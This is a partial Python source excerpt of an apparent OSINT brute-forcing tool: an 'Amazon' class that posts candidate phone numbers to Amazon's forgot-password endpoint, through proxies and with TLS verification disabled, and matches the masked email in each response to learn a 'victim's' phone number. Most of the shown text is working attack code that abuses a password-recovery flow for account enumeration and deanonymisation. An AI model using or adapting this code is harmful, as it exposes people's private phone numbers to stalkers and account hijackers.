...
class Amazon(Bruteforcer):
    logger = logging.getLogger(__name__)

    def bruteforce(self):
        self.logger.info("Using Amazon to find victim's phone number...")
        ...
        for phoneNumber in self.possible_phone_numbers:
            ...
            prev_rid = re.search('name="prevRID" value="(.*)"', response.text).group(1)
            ...
            csmhit_cookie = {"version": 0, "name": 'csm-hit',
            ...
            response = session.post("https://www.amazon.com/ap/forgotpassword/",
                                    ...
                                    data="prevRID=" + urllib.quote(prev_rid) +
            ...
            if "Location" in response.headers:
                ...
                if "prevRID" in redirect_url:
                    ...
                    response = session.get("https://www.amazon.com" + redirect_url,
                                           headers={"Cache-Control": "max-age=0",
                                                    "Upgrade-Insecure-Requests": "1",
                                                    "User-Agent": user_agent,
                                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            ...
            if response.status_code >= 500:  # Error, let's try again
                ...
                response = session.post(
                    ...
                    data="prevRID=" + prev_rid +
                         "&workflowState=" + workflow_state +
                         "&fppOptions=notSkip",
                    proxies=proxy,
                    verify=False)

                if not re.search(email_regex,
                                 response.text):  # Sometimes no mask is shown, just the actual phone number
                    self.logger.warning(self.colors.YELLOW + "No masked email displayed for number: " + phoneNumber + self.colors.ENDC)
                    continue

                masked_email = re.search(email_regex, response.text).group(0)
                if len(self.email) == len(masked_email) and self.email[0] == masked_email[0] and self.email[
                                                                                                   self.email.find(
                                                                                                       '@') - 1:] == masked_email[
                                                                                                                     masked_email.find(
                                                                                                                         '@') - 1:]:
                    self.logger.info(self.colors.GREEN + "Possible phone number for " + self.email + " is: " + phoneNumber + self.colors.ENDC)
                    possible_number_found = True
                else:
                    self.logger.warning(
                        self.colors.YELLOW + "No match for email: " + masked_email + " and number: " + phoneNumber + self.colors.ENDC)
                ...
                self.logger.error(self.colors.RED + "Unknown error" + self.colors.ENDC)
                self.logger.error(self.colors.RED + response.text + self.colors.ENDC)
                exit("Unknown error!")

        if not possible_number_found:
            self.logger.info(self.colors.RED + "Couldn't find a phone number associated to " + self.email + self.colors.ENDC)
